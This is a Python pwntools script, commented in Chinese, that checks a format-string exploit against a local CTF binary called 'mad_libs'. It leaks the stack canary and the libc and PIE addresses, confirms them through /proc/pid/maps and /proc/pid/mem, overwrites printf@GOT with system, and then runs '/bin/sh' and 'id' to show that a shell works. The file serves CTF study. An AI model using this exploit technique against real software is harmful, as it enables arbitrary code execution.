#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pwn2 (mad_libs) —— 「自己證明 GOT 真的被改掉」的自我檢查腳本。

不需要 gdb、也不需要相信 write-up 裡的任何數字：
  * 我們用 %41$p / %43$p / %47$p 洩漏 canary / 返回位址 / main 指標
  * 換算出 libc_base 與 pie_base
  * 直接讀目標行程的 /proc/<pid>/maps 與 /proc/<pid>/mem
  * 在改 GOT 之前/之後各讀一次 printf@GOT 的內容

若 maps 與 leak 兩行完全相同、且 printf@GOT 由 libc 的 printf 變成 libc 的 system，
就證明「format string 任意寫」真的把 GOT 改掉了。

用法：
    cd /home/kzzz/Documents/code/ctf/sunshine/pwn2
    python3 selfcheck.py
"""
from pwn import *
import time

context.log_level = 'error'
context.arch = 'amd64'

io  = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './mad_libs'], cwd='.')
pid = io.pid

io.recvuntil(b'(1) > ')
io.sendline(b'|'.join(b'%%%d$p' % i for i in (41, 43, 47)))
line = io.recvuntil(b'(2) > ', timeout=5)[:-len(b'(2) > ')].strip()
canary, ret, mainp = (int(x, 16) for x in line.split(b'|'))
libc_base, pie_base = ret - 0x2a1ca, mainp - 0x11c9      # 洩漏值換算 base


def base_of(name):                                        # 問核心：這個檔被載到哪
    maps = open('/proc/%d/maps' % pid).read()
    return int([l for l in maps.splitlines() if name in l][0].split('-')[0], 16)


print('maps  libc=%#x pie=%#x' % (base_of('libc.so.6'), base_of('mad_libs')))
print('leak  libc=%#x pie=%#x' % (libc_base, pie_base))   # 兩者必須一模一樣且頁對齊


def mem(addr, n=8):                                       # ★ 直接讀行程記憶體
    with open('/proc/%d/mem' % pid, 'rb') as f:
        f.seek(addr)
        return f.read(n)


system     = libc_base + 0x58740
printf_got = pie_base  + 0x4010
print('printf@GOT before = %#x   (libc printf = %#x)' % (u64(mem(printf_got)), libc_base + 0x600f0))

payload = fmtstr_payload(8, {printf_got: p64(system)[:6]},
                         write_size='byte', numbwritten=0, badbytes=b'\n')
io.sendline(payload)                                      # 第 2 次迴圈：改 GOT
time.sleep(0.5)
after = u64(mem(printf_got))
print('printf@GOT after  = %#x   (system     = %#x)  match=%s' % (after, system, after == system))
io.sendline(b'/bin/sh'); time.sleep(0.4); io.recvrepeat(0.3)
io.sendline(b'echo SHELL_OK; id; echo DONE')              # 第 3 次迴圈：printf(buf) == system(buf)
print(io.recvuntil(b'DONE', timeout=5))
io.close()
